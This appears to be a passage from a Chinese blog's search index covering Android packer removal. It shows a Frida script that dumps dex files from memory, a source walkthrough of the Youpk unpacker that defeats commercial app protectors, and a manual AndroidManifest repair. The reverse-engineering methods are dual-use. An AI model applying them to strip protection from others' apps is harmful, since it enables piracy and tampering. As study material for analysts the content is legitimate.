  &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer7/14.png\" alt=\"image-20211214131746892\"></p>\n<h3 id=\"3-通过mCookie获取dexFile起始地址和大小\"><a href=\"#3-通过mCookie获取dexFile起始地址和大小\" class=\"headerlink\" title=\"3.通过mCookie获取dexFile起始地址和大小\"></a>3.通过mCookie获取dexFile起始地址和大小</h3><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> savepath = <span class=\"string\">&quot;/sdcard/&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">savedexfile</span>(<span class=\"params\">dexfileptr</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//将mCookie转换为对应的dexfile内存指针</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> dexfilebegin = <span class=\"title function_\">ptr</span>(dexfileptr).<span class=\"title function_\">add</span>(<span class=\"title class_\">Process</span>.<span class=\"property\">pointerSize</span>*<span class=\"number\">1</span>).<span class=\"title function_\">readPointer</span>(); <span class=\"comment\">//dex的初始指针</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> dexfilesize = <span class=\"title function_\">ptr</span>(dexfileptr).<span class=\"title function_\">add</span>(<span class=\"title class_\">Process</span>.<span class=\"property\">pointerSize</span>*<span class=\"number\">2</span>).<span class=\"title function_\">readU32</span>(); <span class=\"comment\">//dex的大小</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> dex = <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(savepath+<span class=\"string\">&quot;_&quot;</span>+dexfilesize+<span class=\"string\">&quot;.dex&quot;</span>,<span class=\"string\">&quot;a&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(dex!=<span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> content = <span class=\"title function_\">ptr</span>(dexfilebegin).<span class=\"title function_\">readByteArray</span>(dexfilesize);</span><br><span class=\"line\">            dex.<span class=\"title function_\">write</span>(content);</span><br><span class=\"line\">            dex.<span class=\"title function_\">flush</span>();</span><br><span class=\"line\">            dex.<span class=\"title function_\">close</span>();</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">warn</span>(<span class=\"string\">&quot;[dumpdex]&quot;</span>+savepath+<span class=\"string\">&quot;_&quot;</span>+dexfilesize+<span class=\"string\">&quot;.dex&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer7/15.png\" alt=\"image-20211214163113934\"></p>\n<p>注意：在Android8.0即更高版本上使用保存，很可能是frida_server版本过低导致出错</p>\n<h2 id=\"六、实验总结\"><a href=\"#六、实验总结\" class=\"headerlink\" title=\"六、实验总结\"></a>六、实验总结</h2><p>本文主要仿造fdex2思想，针对于第一代的整体加固，开发支持android全版本的自动化脱壳脚本</p>\n","categories":["Android加壳与脱壳"],"tags":["逆向技术","加壳与脱壳"]},{"title":"Android加壳与脱壳（8）——Youpk脱壳机源码分析","url":"/2022/12/04/Packer8/","content":"<h2 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1.前言\"></a>1.前言</h2><p>今天来分析一下自动脱壳机Youpk的源码，Youpk是一个可以解决整体壳、抽取壳的脱壳机，可以解决自解密型的抽取壳。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"2-源码分析\"><a href=\"#2-源码分析\" class=\"headerlink\" title=\"2.源码分析\"></a>2.源码分析</h2><h3 id=\"2-1-创建脱壳线程\"><a href=\"#2-1-创建脱壳线程\" class=\"headerlink\" title=\"2.1 创建脱壳线程\"></a>2.1 创建脱壳线程</h3><p><code>frameworks/base/core/java/android/app/ActivityThread.java</code></p>\n<p>函数：<code>handleBindApplication</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/1.png\" alt=\"image-20221117163521650\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/2.png\" alt=\"image-20221117163700704\"></p>\n<p>这里选择这个函数，是因为Android系统的执行流程，都要经过这个函数，且与FART的选择点有区别</p>\n<p><code>art/runtime/unpacker/unpacker.cc</code></p>\n<p>函数：<code>unpack</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/3.png\" alt=\"image-20221117172452859\"></p>\n<p>我们可以依次看见4个功能模块：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）初始化</span><br><span class=\"line\">（2）dump所有dex</span><br><span class=\"line\">（3）主动调用所有方法</span><br><span class=\"line\">（4）还原</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-2-初始化init\"><a href=\"#2-2-初始化init\" class=\"headerlink\" title=\"2.2 初始化init()\"></a>2.2 初始化init()</h3><p><code>unpacker/unpacker.cc</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/4.png\" alt=\"image-20221117184318818\"></p>\n<p>在<code>data/data/process</code>目录下新建三个文件夹<code>dex</code>、<code>method</code>、<code>unpacker.json</code></p>\n<p><code>getDexFiles：</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/5.png\" alt=\"image-20221117184846884\"></p>\n<p>内存中dump DEX，DEX文件在art虚拟机中使用DexFile对象表示, 而ClassLinker中引用了这些对象, 因此可以采用从ClassLinker中遍历DexFile对象并dump的方式来获取</p>\n<p>注意：因为从内存中dump，所以无法针对动态加载的壳进行解决，因为这类壳需要完成类加载器的修正，而youpk就没有完成该部分的工作</p>\n<p>另外, 为了避免dex做任何形式的优化影响dump下来的dex文件, 在dex2oat中设置 CompilerFilter 为仅验证</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">//dex2oat.cc</span><br><span class=\"line\">compiler_options_-&gt;SetCompilerFilter(CompilerFilter::kVerifyAtRuntime);</span><br></pre></td></tr></table></figure>\n\n<p><code>getAppClassLoader:</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/6.png\" alt=\"image-20221117185448621\"></p>\n<p>通过反射获得当前的类加载器</p>\n<h3 id=\"2-3-dump所有dex-DumpAllDexs\"><a href=\"#2-3-dump所有dex-DumpAllDexs\" class=\"headerlink\" title=\"2.3 dump所有dex DumpAllDexs()\"></a>2.3 dump所有dex DumpAllDexs()</h3><p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/7.png\" alt=\"image-20221117185652660\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">代码解析：</span><br><span class=\"line\">（1）对dexs文件进行Dump，根据begin和大小</span><br><span class=\"line\">（2）并且对抗了dex魔术字段被抹除的形式  可借鉴</span><br><span class=\"line\">（3）成功的保存  可改进</span><br></pre></td></tr></table></figure>\n\n<p>功能：对Dexfile的文件进行Dump</p>\n<h3 id=\"2-4-主动调用链invokeAllMethods\"><a href=\"#2-4-主动调用链invokeAllMethods\" class=\"headerlink\" title=\"2.4 主动调用链invokeAllMethods()\"></a>2.4 主动调用链invokeAllMethods()</h3><p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/8.png\" alt=\"image-20221117190319146\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">代码解析：</span><br><span class=\"line\">（1）获得Dex的位置、dump路径、类大小</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/9.png\" alt=\"image-20221117192614372\"></p>\n<p>如果路径、位置、大小都相等，则说明是处理过后的dex</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/10.png\" alt=\"image-20221117192816317\"></p>\n<p>这里对<code>init</code>进行处理</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/11.png\" alt=\"image-20221118101348194\"></p>\n<p>将一些dex的信息保存到Json中</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/12.png\" alt=\"image-20221118101716662\"></p>\n<p>遍历dex的所有ClassDef</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/13.png\" alt=\"image-20221121101508613\"></p>\n<p>读取一些函数的状态</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/14.png\" alt=\"image-20221121101628110\"></p>\n<p>对函数初始化进行处理，对未经过初始化的函数进行初始化</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/15.png\" alt=\"image-20221121103024584\"></p>\n<p>开启虚假的调用</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/16.png\" alt=\"image-20221121103144283\"></p>\n<p>对方法进行遍历，对非抽象方法或非静态方法进行模拟调用</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/17.png\" alt=\"image-20221121103303751\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/18.png\" alt=\"image-20221121103337569\"></p>\n<p>关闭模拟调用开关，然后将状态进行修改</p>\n<h3 id=\"2-5-系统源码\"><a href=\"#2-5-系统源码\" class=\"headerlink\" title=\"2.5 系统源码\"></a>2.5 系统源码</h3><p><code>artmethod.cc</code></p>\n<p>Invoke()函数：修改</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/19.png\" alt=\"image-20221121103810915\"></p>\n<p>如果是主动调用，并且不是native方法就强制走解释器</p>\n<p>如果是主动调用并且是native方法则不执行</p>\n<p><code>interpreter.cc</code></p>\n<p>EnterInterpreterFromInvoke()函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">void EnterInterpreterFromInvoke(Thread* self, ArtMethod* method, Object* receiver,</span><br><span class=\"line\">                                uint32_t* args, JValue* result,</span><br><span class=\"line\">                                bool stay_in_interpreter) &#123;</span><br></pre></td></tr></table></figure>\n\n<p>在这里面函数youpk并未进行处理</p>\n<p>但是这里youpk强制修改了解释器：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/20.png\" alt=\"image-20221121104329362\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/21.png\" alt=\"image-20221121104422252\"></p>\n<p>Execute()函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> JValue <span class=\"title function_\">Execute</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">    Thread* self,</span></span><br><span class=\"line\"><span class=\"params\">    <span class=\"type\">const</span> DexFile::CodeItem* code_item,</span></span><br><span class=\"line\"><span class=\"params\">    ShadowFrame&amp; shadow_frame,</span></span><br><span class=\"line\"><span class=\"params\">    JValue result_register,</span></span><br><span class=\"line\"><span class=\"params\">    <span class=\"type\">bool</span> stay_in_interpreter = <span class=\"literal\">false</span>)</span> <span class=\"title function_\">SHARED_REQUIRES</span><span class=\"params\">(Locks::mutator_lock_)</span> &#123;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/22.png\"></p>\n<p><code>interpreter_switch_impl.cc</code></p>\n<p><strong>ExecuteSwitchImpl()函数：修改</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">JValue <span class=\"title function_\">ExecuteSwitchImpl</span><span class=\"params\">(Thread* self, <span class=\"type\">const</span> DexFile::CodeItem* code_item,</span></span><br><span class=\"line\"><span class=\"params\">                         ShadowFrame&amp; shadow_frame, JValue result_register,</span></span><br><span class=\"line\"><span class=\"params\">                         <span class=\"type\">bool</span> interpret_one_instruction)</span> &#123;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/23.png\" alt=\"image-20221121105254503\"></p>\n<p>可以发现当程序进入Switch进行翻译后，翻译每条指令之前，都会执行PREAMBLE()方法，而Youpk就对这里进行了修改，这里与FARTExt区别的地方，就是这里是利用了解析器的判断：</p>\n<p><strong>PREAMBLE()函数：修改</strong></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/24.png\" alt=\"image-20221121105530110\"></p>\n<p>在程序翻译之前都要使用<code>beforeInstructionExecute</code>进行判断，这里就是Youpk深度调用链的地方，处理（NOP、Goto）等壳的地方，如果已经dump了就直接返回，这里程序结束，这里可以进行改进</p>\n<p><code>unpacker.cc</code></p>\n<p><strong>beforeInstructionExecute()函数：修改</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//继续解释执行返回false, dump完成返回true</span></span><br><span class=\"line\"><span class=\"type\">bool</span> <span class=\"title function_\">Unpacker::beforeInstructionExecute</span><span class=\"params\">(Thread *self, ArtMethod *method, <span class=\"type\">uint32_t</span> dex_pc, <span class=\"type\">int</span> inst_count)</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (Unpacker::isFakeInvoke(self, method)) &#123;</span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"type\">uint16_t</span>* <span class=\"type\">const</span> insns = method-&gt;GetCodeItem()-&gt;insns_;</span><br><span class=\"line\">    <span class=\"type\">const</span> Instruction* inst = Instruction::At(insns + dex_pc);</span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> inst_data = inst-&gt;Fetch16(<span class=\"number\">0</span>);</span><br><span class=\"line\">    Instruction::Code opcode = inst-&gt;Opcode(inst_data);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//对于一般的方法抽取(非ijiami, najia), 直接在第一条指令处dump即可</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (inst_count == <span class=\"number\">0</span> &amp;&amp; opcode != Instruction::GOTO &amp;&amp; opcode != Instruction::GOTO_16 &amp;&amp; opcode != Instruction::GOTO_32) &#123;</span><br><span class=\"line\">      Unpacker::dumpMethod(method);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//ijiami, najia的特征为: goto: goto_decrypt; nop; ... ; return; const vx, n; invoke-static xxx; goto: goto_origin;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (inst_count == <span class=\"number\">0</span> &amp;&amp; opcode &gt;= Instruction::GOTO &amp;&amp; opcode &lt;= Instruction::GOTO_32) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (inst_count == <span class=\"number\">1</span> &amp;&amp; opcode &gt;= Instruction::CONST_4 &amp;&amp; opcode &lt;= Instruction::CONST_WIDE_HIGH16) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (inst_count == <span class=\"number\">2</span> &amp;&amp; (opcode == Instruction::INVOKE_STATIC || opcode == Instruction::INVOKE_STATIC_RANGE)) &#123;</span><br><span class=\"line\">      <span class=\"comment\">//让这条指令真正的执行</span></span><br><span class=\"line\">      Unpacker::disableFakeInvoke();</span><br><span class=\"line\">      Unpacker::enableRealInvoke();</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (inst_count == <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (opcode &gt;= Instruction::GOTO &amp;&amp; opcode &lt;= Instruction::GOTO_32) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//写入时将第一条GOTO用nop填充</span></span><br><span class=\"line\">        <span class=\"type\">const</span> Instruction* inst_first = Instruction::At(insns);</span><br><span class=\"line\">        Instruction::Code first_opcode = inst_first-&gt;Opcode(inst-&gt;Fetch16(<span class=\"number\">0</span>));</span><br><span class=\"line\">        CHECK(first_opcode &gt;= Instruction::GOTO &amp;&amp; first_opcode &lt;= Instruction::GOTO_32);</span><br><span class=\"line\">        ULOGD(<span class=\"string\">&quot;found najia/ijiami %s&quot;</span>, PrettyMethod(method).c_str());</span><br><span class=\"line\">        <span class=\"keyword\">switch</span> (first_opcode)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> Instruction::GOTO:</span><br><span class=\"line\">          Unpacker::dumpMethod(method, <span class=\"number\">2</span>);</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> Instruction::GOTO_16:</span><br><span class=\"line\">          Unpacker::dumpMethod(method, <span class=\"number\">4</span>);</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> Instruction::GOTO_32:</span><br><span class=\"line\">          Unpacker::dumpMethod(method, <span class=\"number\">8</span>);</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        Unpacker::dumpMethod(method);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    Unpacker::dumpMethod(method);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）对于一般的方法，直接进行Dump，然后返回ture，不需要继续运行</span><br><span class=\"line\">（2）对于特殊类型的壳，返回false，让其真正的运行起来</span><br><span class=\"line\">（3）运行过INVOKE_STATIC_RANGE，需要将程序真正的执行，然后再判断GOTO进行Dump</span><br></pre></td></tr></table></figure>\n\n<p><strong>dumpMethod()函数：</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">Unpacker::dumpMethod</span><span class=\"params\">(ArtMethod *method, <span class=\"type\">int</span> nop_size)</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"built_in\">string</span> dump_path = Unpacker::getMethodDumpPath(method);</span><br><span class=\"line\">  <span class=\"type\">int</span> fd = <span class=\"number\">-1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (Unpacker_method_fds_.find(dump_path) != Unpacker_method_fds_.end()) &#123;</span><br><span class=\"line\">    fd = Unpacker_method_fds_[dump_path];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    fd = open(dump_path.c_str(), O_RDWR | O_CREAT | O_APPEND, <span class=\"number\">0777</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (fd == <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      ULOGE(<span class=\"string\">&quot;open %s error: %s&quot;</span>, dump_path.c_str(), strerror(errno));</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    Unpacker_method_fds_[dump_path] = fd;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">uint32_t</span> index = method-&gt;GetDexMethodIndex();</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"built_in\">string</span> str_name = PrettyMethod(method);</span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span>* name = str_name.c_str();</span><br><span class=\"line\">  <span class=\"type\">const</span> DexFile::CodeItem* code_item = method-&gt;GetCodeItem();</span><br><span class=\"line\">  <span class=\"type\">uint32_t</span> code_item_size = (<span class=\"type\">uint32_t</span>)Unpacker::getCodeItemSize(method);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">size_t</span> total_size = <span class=\"number\">4</span> + <span class=\"built_in\">strlen</span>(name) + <span class=\"number\">1</span> + <span class=\"number\">4</span> + code_item_size;</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"built_in\">vector</span>&lt;<span class=\"type\">uint8_t</span>&gt; <span class=\"title function_\">data</span><span class=\"params\">(total_size)</span>;</span><br><span class=\"line\">  <span class=\"type\">uint8_t</span>* buf = data.data();</span><br><span class=\"line\">  <span class=\"built_in\">memcpy</span>(buf, &amp;index, <span class=\"number\">4</span>);</span><br><span class=\"line\">  buf += <span class=\"number\">4</span>;</span><br><span class=\"line\">  <span class=\"built_in\">memcpy</span>(buf, name, <span class=\"built_in\">strlen</span>(name) + <span class=\"number\">1</span>);</span><br><span class=\"line\">  buf += <span class=\"built_in\">strlen</span>(name) + <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"built_in\">memcpy</span>(buf, &amp;code_item_size, <span class=\"number\">4</span>);</span><br><span class=\"line\">  buf += <span class=\"number\">4</span>;</span><br><span class=\"line\">  <span class=\"built_in\">memcpy</span>(buf, code_item, code_item_size);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (nop_size != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(buf + offsetof(DexFile::CodeItem, insns_), <span class=\"number\">0</span>, nop_size);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> written_size = write(fd, data.data(), total_size);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (written_size &gt; (<span class=\"type\">ssize_t</span>)total_size) &#123;</span><br><span class=\"line\">    ULOGW(<span class=\"string\">&quot;write %s in %s %zd/%zu error: %s&quot;</span>, PrettyMethod(method).c_str(), dump_path.c_str(), written_size, total_size, strerror(errno));</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里面进行了dex的重构，然后直接进行dump</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/25.png\" alt=\"image-20221121111506337\"></p>\n<p>switch解释完，这里再进行一次判断</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">bool</span> <span class=\"title function_\">Unpacker::afterInstructionExecute</span><span class=\"params\">(Thread *self, ArtMethod *method, <span class=\"type\">uint32_t</span> dex_pc, <span class=\"type\">int</span> inst_count)</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">uint16_t</span>* <span class=\"type\">const</span> insns = method-&gt;GetCodeItem()-&gt;insns_;</span><br><span class=\"line\">  <span class=\"type\">const</span> Instruction* inst = Instruction::At(insns + dex_pc);</span><br><span class=\"line\">  <span class=\"type\">uint16_t</span> inst_data = inst-&gt;Fetch16(<span class=\"number\">0</span>);</span><br><span class=\"line\">  Instruction::Code opcode = inst-&gt;Opcode(inst_data);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (inst_count == <span class=\"number\">2</span> &amp;&amp; (opcode == Instruction::INVOKE_STATIC || opcode == Instruction::INVOKE_STATIC_RANGE) </span><br><span class=\"line\">      &amp;&amp; Unpacker::isRealInvoke(self, method)) &#123;</span><br><span class=\"line\">    Unpacker::enableFakeInvoke();</span><br><span class=\"line\">    Unpacker::disableRealInvoke();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里就看到每个指令都执行了PREAMBLE函数。然后每个指令执行完都执行了afterInstructionExecute这个函数。在这里就可以判断，如果执行完的指令是INVOKE_STATIC。就可以直接return结束掉函数执行了。</p>\n<p>整体通过enableFakeInvoke和disableRealInvoke来控制下一个指令执行的时候来进行退出函数</p>\n<h3 id=\"2-6-还原fini\"><a href=\"#2-6-还原fini\" class=\"headerlink\" title=\"2.6 还原fini()\"></a>2.6 还原fini()</h3><p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer8/26.png\" alt=\"image-20221121112325511\"></p>\n<p>将虚拟执行和真实执行，以及json一些参数恢复到起始状态，到这里整个脱壳机的源码则分析完成</p>\n<h2 id=\"3-总结\"><a href=\"#3-总结\" class=\"headerlink\" title=\"3.总结\"></a>3.总结</h2><p>本文分析了抽取壳的自动脱壳机youpk的源码，为后续进一步学习加壳和脱壳做铺垫，相关资料存放知识星球和微信公众号。</p>\n","categories":["Android加壳与脱壳"],"tags":["逆向技术","加壳与脱壳"]},{"title":"Android加壳与脱壳（9）—— 一次manifest文件修复","url":"/2023/01/05/Packer9/","content":"<h2 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1.前言\"></a>1.前言</h2><ul>\n<li>某个manifest文件发现jadx和apktool均不能反编译，用jadx打开是这样的<span id=\"more\"></span></li>\n</ul>\n<p><img src=\"https://packer-1307040378.cos.ap-chengdu.myqcloud.com/packer9/Untitled.png\" alt=\"Untitled\"></p>\n<ul>\n<li>仔细一看说的应该是字符串的起始位置不对，应该是0x654,实际上是0x650</li>\n<li>但确实不太了解manifest的结构于是搜了一下相关的解决办法但都没法解决这个manifest文件的问题，于是乎决定自己把manifest的格式看一遍</li>\n<li>这里参考的是**<a href=\"https://bbs.pediy.com/user-home-444052.htm\">MindMac</a>** 大佬写的文章中的格式，贴一个大佬的图</li>\n</ul>\n<p><img src=\"https://packer-1307040378.cos.ap-chengdu.myqcloud.com/packer9/Untitled%201.png\" alt=\"Untitled\"></p>\n<ul>\n<li>从头开始配合 010 editor提供的模板进行分析</li>\n</ul>\n<h2 id=\"2-分析\"><a href=\"#2-分析\" class=\"headerlink\" title=\"2.分析\"></a>2.分析</h2><h3 id=\"2-1-魔术和文件头\"><a href=\"#2-1-魔术和文件头\" class=\"headerlink\" title=\"2.1 魔术和文件头\"></a>2.1 魔术和文件头</h3><ul>\n<li>检验了一下都是没问题的</li>\n</ul>\n<p><img src=\"https://packer-1307040378.cos.ap-chengdu.myqcloud.com/packer9/Untitled%202.png\" alt=\"Untitled\"></p>\n<h3 id=\"2-2-stringChunk\"><a href=\"#2-2-stringChunk\" class=\"headerlink\" title=\"2.2 stringChunk\"></a>2.2 stringChunk</h3><ul>\n<li><strong>String Chunk 的标识，值为 0x001C0001 没问题</strong></li>\n<li>String Chunk的大小：0x6b38 <strong>没问题</strong></li>\n<li>string chunk内容区间 (0x08开始  加上面的大小): 0x08 -  6b40 <strong>没问题</strong></li>\n<li>字符串个数 ：395个 从offset中的个数和实际个数检查都 <strong>没问题</strong></li>\n</ul>\n<p><img src=\"https://packer-1307040378.cos.ap-chengdu.myqcloud.com/packer9/Untitled%203.png\" alt=\"Untitled\"></p>\n<p><img src=\"https://packer-1307040378.cos.ap-chengdu.myqcloud.com/packer9/Untitled%204.png\" alt=\"Untitled\"></p>\n<ul>\n<li>字符串起始位置：这里要注意字符串其实位置实际上是1ch中的偏移<strong>加0x8</strong>(即stringChunk的起始位置)<ul>\n<li>即0x64c + 0x8 &#x3D; 0x654</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"https://packer-1307040378.cos.ap-chengdu.myqcloud.com/packer9/Untitled%205.png\" alt=\"Untitled\"></p>\n<ul>\n<li>这里其实就出现了jadx里报错的0x654</li>\n<li>去看一下0x654的内容，确实是一个字符串，但是发现前面有4个字节在manifest的模板里是找不到的</li>\n</ul>\n<p><img src=\"https://packer-1307040378.cos.ap-chengdu.myqcloud.com/packer9/Untitled%206.png\" alt=\"Untitled\"></p>\n<p><img src=\"https://packer-1307040378.cos.ap-chengdu.myqcloud.com/packer9/Untitled%207.png\" alt=\"Untitled\"></p>\n<ul>\n<li>看了其他几个正常反编译的manifest也发现<strong>string offsets</strong>后面应该直接跟<strong>string pool</strong>（实际的字符串内容），因为大多数manifest都没有style所以style pool offset的偏移item是没有的</li>\n<li>所以感觉应该是这4个00 导致的问题</li>\n</ul>\n<h2 id=\"3-复原\"><a href=\"#3-复原\" class=\"headerlink\" title=\"3.复原\"></a>3.复原</h2><ul>\n<li>因为可能是这4个字节的问题所以直接将其删除</li>\n<li>但是删除会影响<ul>\n<li><strong>整个文件大小</strong>： 0xf6a84 - 0x4 &#x3D; 0xf6a80</li>\n<li><strong>String Chunk的大小</strong>: 0x6b38h - 0x4 &#x3D; 0x6b34</li>\n</ul>\n</li>\n<li>然后恢复真正的<strong>stringPooloffset：</strong>0x648</li>\n<li>将三个字段修复好后脱到jadx中 <strong>反编译成功!!!</strong></li>\n</ul>\n<p><img 